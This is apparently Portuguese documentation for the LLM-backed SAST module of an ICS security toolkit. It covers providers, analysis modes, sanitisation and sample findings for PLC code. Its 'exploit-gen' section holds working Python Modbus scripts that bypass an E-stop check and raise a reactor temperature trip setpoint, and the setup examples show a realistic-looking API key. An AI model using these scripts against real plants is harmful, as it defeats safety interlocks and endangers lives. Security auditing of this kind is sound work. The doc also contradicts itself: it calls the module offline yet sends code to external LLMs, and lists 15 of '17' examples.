# SAST / Análise LLM

O IXF inclui um módulo de Análise Estática de Segurança de Aplicações (SAST) offline alimentado por LLMs. Ele analisa código-fonte PLC/RTU para vulnerabilidades de segurança, setpoints inseguros, lacunas de autenticação e vetores de ataque específicos de processo — sem fazer upload do código para serviços externos de forma não intencional.

O código-fonte é **sanitizado antes do envio** para remover credenciais, IPs internos e outros dados sensíveis. A análise é realizada por um LLM externo, mas os dados sensíveis são removidos do contexto enviado.

---

## Índice

1. [Todos os 5 Providers com Detalhes Completos](#todos-os-5-providers-com-detalhes-completos)
2. [llm-key para Cada Provider](#llm-key-para-cada-provider)
3. [Todos os 4 Modos de Análise com Saída Completa](#todos-os-4-modos-de-análise-com-saída-completa)
4. [Linguagens PLC Suportadas](#linguagens-plc-suportadas)
5. [Tabela de Sanitização com Antes/Depois](#tabela-de-sanitização-comantesdepois)
6. [8 Categorias de Análise com Exemplos de Achados](#8-categorias-de-análise-com-exemplos-de-achados)
7. [API Python](#api-python)
8. [Todos os 17 Exemplos em sast_examples/](#todos-os-17-exemplos-em-sast_examples)

---

## Todos os 5 Providers com Detalhes Completos

O IXF suporta cinco providers de LLM para análise SAST. Cada provider usa um modelo específico e requer uma chave de API configurada.

### Provider 1: OpenAI

| Campo | Valor |
|-------|-------|
| Provider ID | `openai` |
| Modelo | `gpt-4o` |
| Variável de ambiente | `OPENAI_API_KEY` |
| Prioridade | 1 (mais alta — usado quando configurado) |
| Endpoint | `https://api.openai.com/v1/chat/completions` |
| Contexto máximo | 128K tokens |
| Custo estimado (1000 linhas PLC) | ~$0.02-0.05 |
| Melhor para | Análises de código complexo, geração de exploit, engenharia reversa |

**Configuração:**
```bash
export OPENAI_API_KEY=sk-svcacct-AbCdEfGhIjKlMnOpQrStUvWxYz...
```

Ou via shell IXF:
```
ixf > llm-key openai sk-svcacct-AbCdEfGhIjKlMnOpQrStUvWxYz...
[+] Chave LLM configurada: provider=openai len=82
```

### Provider 2: Anthropic

| Campo | Valor |
|-------|-------|
| Provider ID | `anthropic` |
| Modelo | `claude-3-5-sonnet-20241022` |
| Variável de ambiente | `ANTHROPIC_API_KEY` |
| Prioridade | 2 |
| Endpoint | `https://api.anthropic.com/v1/messages` |
| Contexto máximo | 200K tokens |
| Custo estimado (1000 linhas PLC) | ~$0.03-0.08 |
| Melhor para | Análise de código longa, relatórios detalhados, explicações técnicas |

**Configuração:**
```bash
export ANTHROPIC_API_KEY=sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz...
```

### Provider 3: Google Gemini

| Campo | Valor |
|-------|-------|
| Provider ID | `gemini` |
| Modelo | `gemini-2.5-flash` |
| Variável de ambiente | `GOOGLE_AI_STUDIO_API_KEY` |
| Prioridade | 3 |
| Endpoint | `https://generativelanguage.googleapis.com/v1beta/...` |
| Contexto máximo | 1M tokens (Gemini 1.5 Pro) / 128K (Flash) |
| Custo estimado (1000 linhas PLC) | ~$0.001-0.005 (mais econômico) |
| Melhor para | Análises de alto volume, prototipagem, testes |

**Configuração:**
```bash
export GOOGLE_AI_STUDIO_API_KEY=AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8
```

### Provider 4: DeepSeek

| Campo | Valor |
|-------|-------|
| Provider ID | `deepseek` |
| Modelo | `deepseek-chat` |
| Variável de ambiente | `DEEPSEEK_API_KEY` |
| Prioridade | 4 |
| Endpoint | `https://api.deepseek.com/v1/chat/completions` |
| Contexto máximo | 64K tokens |
| Custo estimado (1000 linhas PLC) | ~$0.001-0.003 (muito econômico) |
| Melhor para | Análises econômicas, código simples de PLC, detecção rápida de padrões |

**Configuração:**
```bash
export DEEPSEEK_API_KEY=sk-deepseek-AbCdEfGhIjKlMnOpQrStUvWxYz...
```

### Provider 5: Grok (xAI)

| Campo | Valor |
|-------|-------|
| Provider ID | `grok` |
| Modelo | `grok-2-latest` |
| Variável de ambiente | `XAI_API_KEY` |
| Prioridade | 5 (mais baixa) |
| Endpoint | `https://api.x.ai/v1/chat/completions` |
| Contexto máximo | 131K tokens |
| Custo estimado (1000 linhas PLC) | ~$0.005-0.02 |
| Melhor para | Análise de código com contexto de notícias recentes, CVEs mais novos |

**Configuração:**
```bash
export XAI_API_KEY=xai-AbCdEfGhIjKlMnOpQrStUvWxYz...
```

### Prioridade de Seleção de Provider

```
OpenAI → Anthropic → Gemini → DeepSeek → Grok → (nenhum — erro)
```

O primeiro provider configurado na ordem acima é usado. Para forçar um provider específico:

```python
# Via API Python
from industrialxpl.core.sast.analyzer import SASTAnalyzer
analyzer = SASTAnalyzer(provider="gemini")  # forçar Gemini
```

---

## `llm-key` para Cada Provider

### Sintaxe

```
ixf > llm-key <provider_id> <api_key>
```

### Exemplos para cada provider

**OpenAI:**
```
ixf > llm-key openai sk-svcacct-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890AbCdEfGhIjKlMnOp
[+] Chave LLM configurada: provider=openai len=82
```

**Anthropic:**
```
ixf > llm-key anthropic sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890AbCdEf
[+] Chave LLM configurada: provider=anthropic len=67
```

**Gemini:**
```
ixf > llm-key gemini AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8
[+] Chave LLM configurada: provider=gemini len=39
```

**DeepSeek:**
```
ixf > llm-key deepseek sk-deepseek-AbCdEfGhIjKlMnOpQrStUv1234567
[+] Chave LLM configurada: provider=deepseek len=45
```

**Grok:**
```
ixf > llm-key grok xai-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890Ab
[+] Chave LLM configurada: provider=grok len=48
```

### Verificar status após configuração

```
ixf > llm-status

  Providers LLM
  ─────────────────────────────────────
  Provider     Status           Modelo
  openai       configurado ✓    gpt-4o
  anthropic    não configurado
  gemini       configurado ✓    gemini-2.5-flash
  deepseek     não configurado
  grok         não configurado
  ─────────────────────────────────────
  Ativo: openai (tem prioridade sobre gemini)
```

---

## Todos os 4 Modos de Análise com Saída Completa

### Modo 1: `sast` — Análise Completa de Vulnerabilidades

Analisa o código para todas as categorias de vulnerabilidade específicas de OT.

**Sintaxe:**
```
ixf > sast <caminho> --mode sast
```

**Exemplo completo com projeto de tratamento de água:**
```
ixf > sast /opt/plc_projects/water_treatment/ --mode sast
[*] Alvo: water_treatment/ (5 arquivos, 245 linhas)
[*] Linguagens: ST (3), FBD (1), IL (1)
[*] Provider: gemini | Sanitizado: 2 credencial(is), 1 IP público
[*] Enviando 9.7 KB para LLM (sanitizado)...
[*] Aguardando resposta do LLM...

  RELATÓRIO DE ANÁLISE DE VULNERABILIDADES SAST
  ═══════════════════════════════════════════════════════════════

  Arquivo analisado: water_treatment/ (5 arquivos)
  Linhas de código: 245 | Linguagens: ST, FBD, IL
  Provider LLM: gemini (gemini-2.5-flash)
  Data da análise: 2026-06-01 16:45:00

  ───────────────────────────────────────────────────────────────
  DESCOBERTA [SEVERIDADE: CRITICAL]: Setpoint de Dosagem de Cloro Não Validado
    Localização: water_treatment.st, linha 48
    Tipo: Falha de Validação de Entrada / Setpoint Inseguro
    Descrição: SP_CHLORINE_HIGH := 4000.0 — valor 2000x acima do limite
               seguro recomendado pela OMS (2.0 mg/L).
               Comentário no código: "Attacker can write 65535 RPM to HR[50]"
    Vetor de Ataque: Escrita Modbus FC16 em HR[200] (DOSE_FACTOR)
                     Não requer autenticação — porta 502 aberta
    Impacto Físico: 4000 mg/L de cloro na água tratada — dose letal para
                    crianças e animais; dano grave à saúde humana
    MITRE ATT&CK para ICS: T0836 (Modify Parameter), T0880 (Loss of Safety)
    Exploração: modbus_write_register(unit=1, address=200, value=2000)
    Remediação: Validar DOSE_FACTOR <= 2.0 antes de aplicar;
               adicionar interlock de hardware independente;
               implementar autenticação para escrita Modbus

  ───────────────────────────────────────────────────────────────
  DESCOBERTA [SEVERIDADE: CRITICAL]: Parâmetros PID Graváveis Sem Autenticação
    Localização: pump_station.fbd, bloco PID_PressureControl
    Tipo: Controle de Acesso Ausente / Modificação de Parâmetro Crítico
    Descrição: Kp, Ki, Kd modificáveis via sessão OPC UA anônima.
               Valores atuais: Kp=1.5, Ki=0.3, Kd=0.1
    Vetor de Ataque: Escrita OPC UA em nós Kp/Ki/Kd (porta 4840)
                     Sem autenticação necessária (SecurityMode=None)
    Impacto Físico: Instabilidade do loop PID → sobrepressão →
                    ruptura de tubulação ou dano ao equipamento
    MITRE: T0807 (Remote Services), T0836 (Modify Parameter), T0882
    Exploração: opcua_write_node(ns=2, id="PID_Kp", value=100.0)
    Remediação: Habilitar OPC UA SecurityMode=SignAndEncrypt;
               exigir autenticação para todas as operações de escrita;
               validar limites de Kp/Ki/Kd no código PLC

  ───────────────────────────────────────────────────────────────
  DESCOBERTA [SEVERIDADE: HIGH]: Condição de Corrida em Dosagem de pH
    Localização: water_treatment.st, linhas 65-71
    Tipo: Race Condition / Lógica Insegura de Controle
    Descrição: Loop de controle de pH sem proteção mutex — escrita
               simultânea de dois scan cycles pode resultar em overdose
    Impacto Físico: pH instável — corrosão de tubulações ou
                    dano a equipamentos de tratamento
    MITRE: T0836 (Modify Parameter)
    Remediação: Implementar semáforo ou lógica de trava no scan cycle

  ───────────────────────────────────────────────────────────────
  DESCOBERTA [SEVERIDADE: HIGH]: Interlock de Emergência Contornável
    Localização: reactor_batch.sfc, passo S3 (StartReaction)
    Tipo: Safety Bypass / Lógica de Segurança Insuficiente
    Descrição: Condição de E-Stop (botão de emergência) não verificada
               antes de transição SFC para passo S3 StartReaction
    Vetor de Ataque: Forçar transição SFC diretamente via escrita de coil Modbus
    Impacto Físico: Inicia reação química sem verificar se E-Stop está OK
    Remediação: Adicionar verificação de E_STOP_OK antes de todas as
               transições SFC críticas

  ───────────────────────────────────────────────────────────────
  DESCOBERTA [SEVERIDADE: MEDIUM]: Credencial Hardcoded Detectada
    Localização: scada_connection.st, linha 12
    Tipo: Exposição de Credencial / Secret Hardcoded
    Descrição: String "PASSWORD=admin123" encontrada hardcoded
    Remediação: Mover para variável de ambiente ou cofre de secrets;
               rotacionar credencial imediatamente

  ═══════════════════════════════════════════════════════════════
  RESUMO: 2 CRÍTICO | 2 ALTO | 1 MÉDIO | 0 BAIXO
  Arquivo de relatório: /opt/plc_projects/.tmp/water_treatment_sast_20260601.md
```

### Modo 2: `reverse` — Engenharia Reversa

Para firmware PLC binário/compilado.

**Sintaxe:**
```
ixf > sast <caminho> --mode reverse
```

**Exemplo completo:**
```
ixf > sast /opt/plc_firmware/controller_v2.bin --mode reverse
[*] Arquivo binário: controller_v2.bin (128 KB)
[*] Tipo: arquivo binário/compilado
[*] Extraindo strings e hexdump...
[*] Strings encontradas: 47 | Interessantes: 12
[*] Enviando para LLM para engenharia reversa...

  RELATÓRIO DE ENGENHARIA REVERSA
  ═══════════════════════════════════════════════════════════════

  Arquivo: controller_v2.bin (131072 bytes)
  Entropia: 7.2 (comprimido ou criptografado — possível packing)
  Magic bytes: 0x7F 0x45 0x4C 0x46 (ELF — executável Linux ARM)
  Arquitetura detectada: ARM Cortex-A (provavelmente embedded Linux)

  ── Strings de Alto Interesse ──────────────────────────────────

  DESCOBERTA [SEVERIDADE: CRITICAL]: Credencial Hardcoded
    String: "PASSWORD=admin123"
    Offset: 0x2A80
    Contexto: Próximas strings: "LOGIN_USER=admin", "AUTH_TYPE=basic"
    Risco: Credenciais de admin hardcoded no firmware

  DESCOBERTA [SEVERIDADE: HIGH]: IP Interno Exposto
    String: "192.168.100.1"
    Offset: 0x3C20
    Contexto: Seguido por "HISTORIAN_SERVER=" — servidor historian
    Risco: Topologia de rede interna exposta no firmware

  DESCOBERTA [SEVERIDADE: HIGH]: Flag de Debug Presente
    String: "DEBUG_MODE=1"
    Offset: 0x5200
    Contexto: Próximas strings: "ENABLE_TELNET=1", "LOG_LEVEL=verbose"
    Risco: Debug mode ativo — Telnet habilitado, log verboso em produção

  DESCOBERTA [SEVERIDADE: MEDIUM]: Bypass de Emergência
    String: "EMERGENCY_BYPASS"
    Offset: 0x4100
    Contexto: Função com acesso sem autenticação
    Risco: Função de bypass de emergência potencialmente abusável

  DESCOBERTA [SEVERIDADE: MEDIUM]: Função de Backdoor Potencial
    String: "BACKDOOR_KEY_2024"
    Offset: 0x6800
    Contexto: Próximas strings: "MAINT_ACCESS=true"
    Risco: Chave de acesso de manutenção não documentada

  ── Análise de Estrutura de Firmware ──────────────────────────
    Seções ELF: .text (código), .data (dados inicializados), .bss (não inicializados)
    Símbolos de função notáveis: modbus_read_coil(), plc_logic_exec(), safety_check()
    Biblioteca detectada: libmodbus 3.1.4 (desatualizada — vulnerabilidades conhecidas)

  ═══════════════════════════════════════════════════════════════
  RESUMO: 1 CRÍTICO | 2 ALTO | 2 MÉDIO | 0 BAIXO
```

### Modo 3: `diff` — Análise Diferencial

Compara duas versões do mesmo programa PLC para identificar modificações não autorizadas.

**Sintaxe:**
```
ixf > sast <arquivo_original> --mode diff --diff <arquivo_modificado>
```

**Exemplo completo:**
```
ixf > sast /opt/plc/v2.3_original.st --mode diff --diff /opt/plc/v2.3_modified.st
[*] Comparando: v2.3_original.st vs v2.3_modified.st
[*] Provider: gemini
[*] Calculando diff...
[*] Linhas alteradas: 7 | Linhas adicionadas: 3 | Linhas removidas: 2
[*] Enviando diff para LLM...

  RELATÓRIO DE ANÁLISE DIFERENCIAL
  ═══════════════════════════════════════════════════════════════

  Arquivo original:   v2.3_original.st (147 linhas, MD5: a1b2c3d4...)
  Arquivo modificado: v2.3_modified.st (148 linhas, MD5: e5f6g7h8...)
  Diferenças: 7 linhas alteradas, 3 adicionadas, 2 removidas

  ───────────────────────────────────────────────────────────────
  DESCOBERTA [SEVERIDADE: CRITICAL]: Limite de Segurança Removido
    Linha (original):  142 | SP_TEMP_TRIP := 280.0;  (* Seguro per safety spec *)
    Linha (modificado): 142 | SP_TEMP_TRIP := 450.0;  (* Raised without documentation *)
    Análise: Setpoint de trip de temperatura aumentado 60.7% acima do spec seguro.
             Limite de 280°C é baseado no spec de segurança HAZOP aprovado.
             Limite de 450°C está acima do ponto de ignição do processo.
    Impacto: Condição de temperatura perigosa pode continuar sem trip de segurança
    Técnica MITRE: T0836 (Modify Parameter) — estilo manipulação TRITON (T0816)
    Recomendação: Reverter IMEDIATAMENTE; investigar quem fez esta mudança e quando;
                 verificar integridade de todos os outros parâmetros de segurança

  ───────────────────────────────────────────────────────────────
  DESCOBERTA [SEVERIDADE: HIGH]: Verificação de E-Stop Desabilitada
    Linha (original):  78 | IF E_STOP_OK AND PRESSURE_OK THEN
    Linha (modificado): 78 | IF TRUE AND PRESSURE_OK THEN
    Análise: Condição de E-Stop substituída por TRUE — botão de emergência ignorado
    Impacto: Inicialização pode ocorrer mesmo com E-Stop ativado
    Recomendação: Restaurar verificação E_STOP_OK; auditar todas as condições de segurança

  ───────────────────────────────────────────────────────────────
  DESCOBERTA [SEVERIDADE: MEDIUM]: Código Adicionado Suspeito
    Linhas adicionadas: 95-97
    Código: (* maint_2024 *) IF maint_mode = TRUE THEN safety_bypass := TRUE; END_IF
    Análise: Bloco de "modo de manutenção" que desabilita safety_bypass
             Sem documentação, sem autorização visível no comentário
    Recomendação: Revisar e remover se não documentado/autorizado

  ═══════════════════════════════════════════════════════════════
  RESUMO: 1 CRÍTICO | 1 ALTO | 1 MÉDIO | 0 BAIXO
  RECOMENDAÇÃO URGENTE: Parâmetros de segurança críticos alterados sem documentação.
                       Acionar processo de revisão de segurança imediatamente.
```

### Modo 4: `exploit-gen` — Geração de Exploit

Gera uma prova de conceito de exploit baseada nas descobertas SAST.

**Sintaxe:**
```
ixf > sast <caminho> --mode exploit-gen
```

**Exemplo completo:**
```
ixf > sast /opt/plc/reactor_batch.sfc --mode exploit-gen
[*] Analisando para padrões exploráveis...
[*] Padrões encontrados: 3 vetores potencialmente exploráveis
[*] Gerando PoCs...

  RELATÓRIO DE GERAÇÃO DE EXPLOIT
  ═══════════════════════════════════════════════════════════════

  ── Exploit 1: Forçar Passo SFC via Modbus ───────────────────

  Alvo: Passo SFC S3 (StartReaction) — verificação de E-Stop ausente
  Vetor: Forçar passo SFC diretamente via escrita de coil Modbus FC05
  Severidade: HIGH | MITRE: T0836 (Modify Parameter)

  PoC Python gerado:
  ─────────────────────────────────────────────────────────────
  import socket
  import struct

  TARGET = "192.168.1.100"
  PORT = 502

  def modbus_write_coil(unit, address, value):
      """Modbus FC05: Write Single Coil"""
      coil_value = 0xFF00 if value else 0x0000
      # MBAP header: transaction=1, protocol=0, length=6
      mbap = struct.pack(">HHH", 1, 0, 6)
      # PDU: unit, FC05, address, value
      pdu = struct.pack(">BBHH", unit, 0x05, address, coil_value)
      return mbap + pdu

  # Forçar coil de transição SFC S3 (endereço 0x0010)
  payload = modbus_write_coil(unit=1, address=0x0010, value=True)

  s = socket.socket()
  s.connect((TARGET, PORT))
  s.send(payload)
  response = s.recv(12)
  print("Passo SFC forçado:", response.hex())
  s.close()
  ─────────────────────────────────────────────────────────────

  ── Exploit 2: Modificação de Setpoint de Temperatura ────────

  Alvo: Setpoint SP_TEMP_TRIP (registrador HR[142])
  Vetor: Modbus FC16 Write Multiple Registers
  Severidade: CRITICAL | MITRE: T0836 (Modify Parameter)

  PoC Python gerado:
  ─────────────────────────────────────────────────────────────
  import socket
  import struct

  def modbus_write_register(target, port, unit, address, value):
      """Modbus FC16: Write Multiple Registers (1 registro)"""
      # Converter float para 2 registradores (IEEE 754 big-endian)
      float_bytes = struct.pack(">f", value)
      reg_hi, reg_lo = struct.unpack(">HH", float_bytes)
      
      # MBAP header
      mbap = struct.pack(">HHH", 1, 0, 11)
      # PDU: unit, FC16, start_addr, count, byte_count, data
      pdu = struct.pack(">BBHHHB", unit, 0x10, address, 2, 4)
      pdu += struct.pack(">HH", reg_hi, reg_lo)
      
      s = socket.socket()
      s.connect((target, port))
      s.send(mbap + pdu)
      response = s.recv(12)
      s.close()
      return response

  # Elevar setpoint de temperatura de 280°C para 450°C
  result = modbus_write_register("192.168.1.100", 502, 1, 142, 450.0)
  print("Setpoint modificado:", result.hex())
  ─────────────────────────────────────────────────────────────

  ═══════════════════════════════════════════════════════════════
  AVISO: PoCs gerados apenas para fins de teste autorizado em ambientes controlados.
         NUNCA execute contra sistemas de produção sem autorização escrita.
```

---

## Linguagens PLC Suportadas

O IXF SAST suporta análise das seguintes linguagens PLC e extensões de arquivo:

| Linguagem | Extensões de Arquivo | Norma | Exemplos de Uso |
|-----------|---------------------|-------|-----------------|
| Structured Text (ST) | `.st`, `.iecst` | IEC 61131-3 | Siemens SCL, Codesys ST |
| Ladder Diagram (LD) | `.lad`, `.ld`, `.ldr` | IEC 61131-3 | Rockwell Studio 5000 |
| Function Block Diagram (FBD) | `.fbd` | IEC 61131-3 | Schneider EcoStruxure |
| Instruction List (IL) | `.il` | IEC 61131-3 | Siemens STL (legado) |
| Sequential Function Chart (SFC) | `.sfc` | IEC 61131-3 | Processos em batelada |
| Siemens SCL/AWL | `.scl`, `.awl`, `.stl` | Siemens específico | TIA Portal, Step 7 |
| Rockwell Tags/Logic | `.acd`, `.l5x` | Rockwell específico | Studio 5000 XML export |
| Codesys | `.project`, `.library` | Codesys V3 | Beckhoff, Phoenix Contact |
| Firmware binário | `.bin`, `.hex`, `.fw` | Qualquer | Para modo reverse |

**Limitações de suporte:**

- LD e FBD em formato XML são suportados parcialmente (extração de texto)
- Arquivos `.acd` Rockwell requerem exportação para `.l5x` primeiro
- Firmware binário é suportado apenas em modo `reverse`
- Arquivos de projeto Codesys com criptografia não são suportados

---

## Tabela de Sanitização com Antes/Depois

O IXF sanitiza automaticamente o código antes de enviá-lo ao LLM para remover informações sensíveis.

| Categoria | Padrão Detectado | Antes (no código) | Após Sanitização |
|-----------|-----------------|-------------------|------------------|
| Credenciais hardcoded | `password=`, `PASSWORD=`, `senha=` | `PASSWORD=admin123` | `PASSWORD=[REDACTED]` |
| Chaves de API | `API_KEY=`, `apikey=` | `API_KEY=AbCdEf123456` | `API_KEY=[REDACTED]` |
| IPs privados | `192.168.x.x`, `10.x.x.x`, `172.16-31.x.x` | `SERVER_IP := '192.168.100.1'` | `SERVER_IP := '[PRIVATE_IP]'` |
| IPs públicos | IPv4 fora de ranges privados | `REMOTE_IP := '203.0.113.45'` | `REMOTE_IP := '[PUBLIC_IP]'` |
| Nomes de host internos | `*.local`, `*.internal`, `*.corp` | `SCADA_HOST := 'scada-01.plant.local'` | `SCADA_HOST := '[INTERNAL_HOST]'` |
| Strings de conexão DB | `Server=`, `Data Source=`, `jdbc:` | `DB := 'Server=192.168.1.10;...'` | `DB := '[DB_CONNECTION]'` |
| Tokens JWT/Bearer | `Bearer `, `ey[A-Za-z0-9]...` | `TOKEN := 'eyJhbGciOiJSUzI...'` | `TOKEN := '[JWT_TOKEN]'` |
| Números de série | padrões de número de série conhecidos | `SERIAL := '6ES7 211-1AE40-0XB0'` | `SERIAL := '[DEVICE_SERIAL]'` |

**Relatório de sanitização exibido antes do envio:**
```
[*] Provider: gemini | Sanitizado: 2 credencial(is), 1 IP público, 1 host interno
[*] Enviando 9.7 KB para LLM (sanitizado)...
```

**Ver detalhes da sanitização (verbose):**
```
ixf > set verbose true
ixf > sast /opt/plc/code.st
[*] Iniciando sanitização...
[SANITIZE] Linha 12: PASSWORD=admin123 → PASSWORD=[REDACTED]
[SANITIZE] Linha 45: 192.168.100.1 → [PRIVATE_IP]
[SANITIZE] Linha 88: scada-01.plant.local → [INTERNAL_HOST]
[*] 3 substituições realizadas
```

---

## 8 Categorias de Análise com Exemplos de Achados

### Categoria 1: Validação de Entrada e Setpoints

**O que é analisado:** Valores de setpoint hardcoded, variáveis sem validação de range, parâmetros de processo críticos graváveis sem restrição.

**Exemplo de achado:**
```
DESCOBERTA [CRÍTICO]: Velocidade de Motor Sem Limite Superior
  Localização: compressor.il, FC3, linha 15
  Código: MW100 → D[SPEED_CMD] (sem validação)
  Ataque: Modbus FC16 write para HR[50] com valor 65535
  Impacto: Motor à 65535 RPM → falha mecânica catastrófica, risco de explosão
  Remediação: IF MW100 > MAX_SAFE_RPM THEN MW100 := MAX_SAFE_RPM; END_IF
```

### Categoria 2: Controle de Acesso e Autenticação

**O que é analisado:** Rotas de acesso sem autenticação, credenciais hardcoded, contas de manutenção sem senha, acesso remoto não autenticado.

**Exemplo de achado:**
```
DESCOBERTA [CRÍTICO]: Acesso de Manutenção Sem Senha
  Localização: maintenance.st, linha 34
  Código: IF maintenance_mode THEN bypass_safety := TRUE; END_IF
  Problema: maintenance_mode pode ser ativado via Modbus sem autenticação
  Remediação: Adicionar autenticação de 2 fatores para ativar maintenance_mode
```

### Categoria 3: Lógica de Processo e Segurança

**O que é analisado:** Intertraves de segurança ausentes, condições de corrida em loops de controle, verificações de E-Stop incompletas, lógica SFC sem guarda de condição.

**Exemplo de achado:**
```
DESCOBERTA [ALTO]: Interlock de Temperatura Ausente em Passo de Reação
  Localização: batch_reactor.sfc, transição T3
  Problema: SFC não verifica TEMP_OK antes de iniciar adição de reagente
  Cenário: Reação exotérmica em temperatura incorreta → risco de runaway
  Remediação: Adicionar condição TEMP_OK AND PRESSURE_OK na transição T3
```

### Categoria 4: Comunicação de Rede e Protocolos

**O que é analisado:** Conexões de rede sem criptografia, serviços de rede desnecessários habilitados, configurações CORS/firewall ausentes, comunicação em texto claro.

**Exemplo de achado:**
```
DESCOBERTA [ALTO]: Modbus Sem Autenticação em Registradores Críticos
  Localização: modbus_config.st, mapa de endereços
  Problema: HR[100]-HR[200] (parâmetros de segurança) acessíveis sem autenticação
  Ataque: Qualquer host na rede OT pode modificar setpoints de segurança
  Remediação: Implementar firewall industrial para restringir escrita Modbus
              a endereços fonte autorizados
```

### Categoria 5: Gerenciamento de Erros e Exceções

**O que é analisado:** Tratamento de erros ausente, falhas silenciosas, estados de falha inseguros, código que continua operação após erro crítico.

**Exemplo de achado:**
```
DESCOBERTA [MÉDIO]: Falha Silenciosa em Comunicação com Sensor
  Localização: sensor_read.st, linhas 45-52
  Problema: Timeout de leitura de sensor retorna último valor válido sem alarme
  Cenário: Sensor com falha não detectado → processo continua com dado desatualizado
  Remediação: Implementar timeout de watchdog e alarme de falha de comunicação
```

### Categoria 6: Integridade e Validação de Dados

**O que é analisado:** Dados de sensor sem verificação de sanidade, valores que excedem faixas físicas plausíveis, dados usados sem validação de fonte.

**Exemplo de achado:**
```
DESCOBERTA [MÉDIO]: Dado de Encoder Sem Verificação de Sanidade
  Localização: conveyor.ld, rung 23
  Problema: Velocidade de encoder aceita qualquer valor (incluindo negativos)
  Cenário: Encoder com falha envia dado incorreto → velocidade negativa calculada
  Remediação: Validar valor encoder em [0, MAX_ENCODER_VALUE] antes de usar
```

### Categoria 7: Configurações de Segurança e Proteção

**O que é analisado:** Configurações padrão não alteradas, portas de serviço desnecessárias abertas, funcionalidades de debug em produção, acesso físico sem proteção.

**Exemplo de achado:**
```
DESCOBERTA [ALTO]: Porta de Diagnóstico Aberta em Produção
  Localização: communication_config.st, linha 89
  Código: DIAGNOSTIC_PORT := 8080; DIAGNOSTIC_ENABLED := TRUE;
  Problema: Porta de diagnóstico habilitada sem autenticação em produção
  Remediação: DIAGNOSTIC_ENABLED := FALSE; — ou adicionar autenticação
```

### Categoria 8: Compatibilidade e Dependências

**O que é analisado:** Bibliotecas desatualizadas com vulnerabilidades conhecidas, funcionalidades deprecadas, protocolos legados inseguros.

**Exemplo de achado:**
```
DESCOBERTA [MÉDIO]: Uso de Protocolo Telnet Legado
  Localização: remote_access.st, linha 12
  Código: TELNET_ENABLED := TRUE; TELNET_PORT := 23;
  Problema: Telnet transmite credenciais em texto claro
  Remediação: Substituir por SSH (porta 22) com autenticação por chave
```

---

## API Python

### Uso básico da API SAST

```python
from industrialxpl.core.sast.analyzer import SASTAnalyzer

# Criar analisador com provider específico
analyzer = SASTAnalyzer(provider="gemini")

# Analisar arquivo único
result = analyzer.analyze_file(
    path="/opt/plc/water_treatment.st",
    mode="sast"
)

# Acessar descobertas
for finding in result.findings:
    print(f"[{finding.severity}] {finding.title}")
    print(f"  Localização: {finding.location}")
    print(f"  MITRE: {', '.join(finding.mitre_techniques)}")
    print(f"  Remediação: {finding.remediation}")
    print()

# Resumo
print(f"Total: {result.total_findings} descobertas")
print(f"Críticos: {result.critical_count}")
print(f"Altos: {result.high_count}")
```

### Análise de diretório completo

```python
from industrialxpl.core.sast.analyzer import SASTAnalyzer
from pathlib import Path

analyzer = SASTAnalyzer()  # usa provider de maior prioridade

# Analisar diretório inteiro
result = analyzer.analyze_directory(
    path=Path("/opt/plc_projects/reactor/"),
    recursive=True,
    file_extensions=[".st", ".fbd", ".sfc"],
    mode="sast"
)

# Gerar relatório Markdown
report_path = result.save_report(
    output_path="/opt/reports/reactor_sast.md",
    format="markdown"
)
print(f"Relatório salvo: {report_path}")
```

### Análise diferencial programática

```python
from industrialxpl.core.sast.analyzer import SASTAnalyzer

analyzer = SASTAnalyzer(provider="openai")

# Comparar duas versões
result = analyzer.diff_analyze(
    original="/opt/plc/v2.3_original.st",
    modified="/opt/plc/v2.3_modified.st"
)

# Verificar se há mudanças críticas
if result.has_critical_changes:
    print("ALERTA: Mudanças críticas de segurança detectadas!")
    for change in result.critical_changes:
        print(f"  {change.description}")
```

### Integração com pipeline CI/CD

```python
from industrialxpl.core.sast.analyzer import SASTAnalyzer
import sys

def run_sast_gate(plc_directory: str, max_critical: int = 0) -> bool:
    """Gate de qualidade SAST para pipeline CI/CD."""
    analyzer = SASTAnalyzer(provider="gemini")
    result = analyzer.analyze_directory(plc_directory)
    
    if result.critical_count > max_critical:
        print(f"FALHA NO GATE: {result.critical_count} descobertas críticas")
        for f in result.critical_findings:
            print(f"  [{f.severity}] {f.title} em {f.location}")
        return False
    
    print(f"Gate SAST aprovado: {result.critical_count} críticos, {result.high_count} altos")
    return True

# Uso no pipeline
if not run_sast_gate("/opt/plc_projects/", max_critical=0):
    sys.exit(1)  # Falha no pipeline
```

---

## Todos os 17 Exemplos em `sast_examples/`

O diretório `industrialxpl/resources/sast_examples/` contém 17 exemplos de código PLC com vulnerabilidades conhecidas para teste e demonstração do SAST.

| Arquivo | Linguagem | Processo Industrial | Vulnerabilidades Incluídas |
|---------|-----------|--------------------|-----------------------------|
| `water_treatment.st` | ST | Tratamento de água | Setpoint de cloro não validado, race condition em pH |
| `nuclear_reactor_cooling.st` | ST | Resfriamento de reator nuclear | Interlock de segurança ausente, credencial hardcoded |
| `gas_pipeline_pressure_control.fbd` | FBD | Controle de pressão de gasoduto | Modificação de PID via OPC UA anônimo, alarme desabilitado |
| `power_grid_substation.st` | ST | Subestação de rede elétrica | Autorização ausente para chaveamento de disjuntor |
| `oil_refinery_process.st` | ST | Refinaria de petróleo | Setpoint de temperatura acima do ponto de ignição |
| `wind_farm_scada.sfc` | SFC | SCADA de parque eólico | Bypasse de E-stop, lógica de pitch sem validação |
| `GRFICSv3_655326.st` | ST | Processo Tennessee Eastman (GRFICSv3) | Múltiplas vulnerabilidades de setpoint |
| `GRFICSv3_690525.st` | ST | Processo Tennessee Eastman variante | Credenciais OPC UA, acesso anônimo |
| `GRFICSv3_attack.st` | ST | Versão pós-ataque do GRFICSv3 | Backdoor inserido, setpoint modificado |
| `GRFICSv3_blank.st` | ST | Template limpo GRFICSv3 | Sem vulnerabilidades (baseline) |
| `GRFICSv3_chemical.st` | ST | Reação química GRFICSv3 | Race condition em dosagem, overflow |
| `GRFICSv3_simplified_te.st` | ST | Processo TE simplificado | Setpoints críticos sem validação |
| `water_treatment_chemical_dosing.st` | ST | Dosagem química de água | Análogo ao ataque Oldsmar 2021 |
| `reactor_batch.sfc` | SFC | Reator em batelada | Verificação E-stop ausente em SFC |
| `compressor_control.il` | IL | Controle de compressor | Velocidade de motor sem limite, overflow |
